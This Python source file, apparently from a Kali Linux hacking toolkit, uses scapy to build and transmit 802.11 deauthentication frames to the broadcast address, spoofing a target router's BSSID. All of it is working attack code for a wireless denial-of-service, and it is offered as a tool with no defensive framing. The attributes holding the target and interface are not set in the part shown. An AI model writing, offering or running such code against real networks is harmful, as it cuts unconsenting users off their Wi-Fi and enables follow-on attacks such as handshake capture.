# Date: 07/20/2017
# Distro: Kali linux
# Author: Ethical-H4CK3R
# Description: Deauthenticate target router

from scapy.all import *

class Deauthenticate(object):
 def __init__(self):
  conf.verb = 0
  self.pkt = None
  self.client = 'ff:ff:ff:ff:ff:ff'

 def configAttack(self):
  self.pkt = RadioTap()/Dot11(type=0,subtype=12,addr1=self.client,
  addr2=self._bssid,addr3=self._bssid)/Dot11Deauth(reason=7)

 def sendPkts(self,*args,**kwargs):
  sendp(self.pkt,iface=self._iface)
